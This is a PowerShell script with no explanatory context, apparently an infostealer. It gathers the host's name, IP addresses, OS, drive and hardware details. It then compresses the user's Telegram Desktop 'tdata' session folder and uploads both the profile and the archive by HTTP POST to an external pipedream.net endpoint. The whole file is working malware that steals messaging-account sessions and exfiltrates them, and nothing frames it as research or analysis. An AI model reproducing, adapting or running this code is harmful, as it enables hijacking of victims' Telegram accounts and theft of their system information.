function GetOsArch()
{
	try
	{
		$osVerBit = "x86";
		$serverflag = "0";
		if ([System.IO.Directory]::Exists("C:\Program Files (x86)") -and [System.IO.Directory]::Exists("C:\Windows\SysWOW64"))
		{
			$osVerBit = "x64";
		}
		if ([System.IO.Directory]::Exists("C:\ProgramData\Microsoft\ServerManager"))
		{
			$serverflag = "1";
		}
		[string] $outstr = $osVerBit + "#" + $serverflag;
	}
	catch
	{
		$outstr = "GetOsArchError!";
	}
	return $outstr;
}
function GetAllIpAddrs()
{
	$ipAll = "";
	$name = [System.Net.Dns]::GetHostName();
	[System.Net.IPAddress[]] $ipadrlist = [System.Net.Dns]::GetHostAddresses($name);
	[System.Net.IPAddress] $ipa;
	foreach ($ipa in $ipadrlist)
	{
		if ($ipa.AddressFamily.ToString() -eq "InterNetwork")
		{
			$ipAll += $ipa.ToString() + '#';
		}
	}
	$ipAll = $ipAll.Substring(0, $ipAll.Length - 1);
	return $ipAll;
}

function GetExplorerMsg()
{
	try
	{
		$filepath = "C:\windows\explorer.exe";
		[System.Diagnostics.FileVersionInfo] $info = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($filepath);
		[System.IO.FileInfo] $fileinfo = New-Object System.IO.FileInfo($filepath);
		[string] $FileVersion = $info.ProductVersion;
		[long] $filesize = $fileinfo.Length;
		[string] $outstring = $FileVersion + "#" + $filesize.ToString();
	}
	catch
	{
		$outstring = "GetExplorerMsgError!";
	}
	return $outstring;
}

function GetDriverInfo()
{
	try
	{
		[string] $result = [System.string].Empty;
		[System.IO.DriveInfo[]] $drivers = [System.IO.DriveInfo]::GetDrives();
		foreach ($tmpDriver in $drivers)
		{
			if ($tmpDriver.IsReady)
			{
				$result += [System.string]::Format("{0}|{1}|{2}|{3}#", $tmpDriver.Name, [int]$tmpDriver.DriveType, $tmpDriver.AvailableFreeSpace, 
$tmpDriver.TotalSize);
			}
		}
	}
	catch
	{
		$result = "GetDriverInfoError";
	}
	
	return $result;
	
}

function GetBasicInfo()
{
	$outputlist = New-Object 'System.Collections.Generic.List[byte]';
	$DataList = New-Object 'System.Collections.Generic.List[byte]';
	try
	{
		[string] $OutString = [System.string].Empty;
		[string] $Hostname = [System.Net.Dns]::GetHostName();
		[string] $AllIpAddress = GetAllIpAddrs;
		[string] $ExplorerMsg = GetExplorerMsg;
		[string] $OsArch = GetOsArch;
		[string] $Env = [System.Environment]::CurrentDirectory;
		[string] $DriverInfo = GetDriverInfo;
		$time = New-Object System.DateTime;
		$time = [System.DateTime]::Now;
		$TimeString = $time.ToString("yyyy-MM-dd HH:mm:ss");
		$OutString =  $Hostname + "," + $AllIpAddress + "," + $ExplorerMsg + "," + $OsArch  + "," + $Env + "," + $DriverInfo + "," + $TimeString;

		# Retrieve computer information
		$computerInfo = Get-WmiObject -Class Win32_ComputerSystem
		$operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
		$processor = Get-WmiObject -Class Win32_Processor

		# Create a hashtable to store the computer information
		$computerDetails =  $computerInfo.Manufacturer + ", " + $computerInfo.Model + ", " + $operatingSystem.Caption + ", " + $processor.Name + ", " +  ("{0:N2} GB" -f ($computerInfo.TotalPhysicalMemory / 1GB))
		
		$OutString =  $OutString  + $computerDetails

	}
	catch
	{
		$OutString = "GetBasicInfoError!";
	}
	
	return $OutString;	
}


$date = Get-Date -UFormat "%Y%m%d%H%M" 
$zipFilePath = "$env:TEMP\" + $date + "_Tele.zip"
$computerInfoString = GetBasicInfo;

$folderTele = "$env:USERPROFILE\AppData\Roaming\Telegram Desktop\tdata"
Compress-Archive -Path $folderTele -DestinationPath $zipFilePath -Force
$date = Get-Date -UFormat "%Y%m%d-%R" 
$url = "https://eo2jk6wmr6178rk.m.pipedream.net/" + $date + "/info.txt"
$data = $computerInfoString
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Content-Type", "text/plain")
$response = $webClient.UploadString($url, "POST", $data)
$webClient.Dispose()

$url = "https://eo2jk6wmr6178rk.m.pipedream.net/" + $date + "/tele.zip"
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Content-Type", "text/plain")
$data = Get-Content -Path $zipFilePath 
$response = $webClient.UploadString($url, "POST", $data)
$webClient.Dispose()
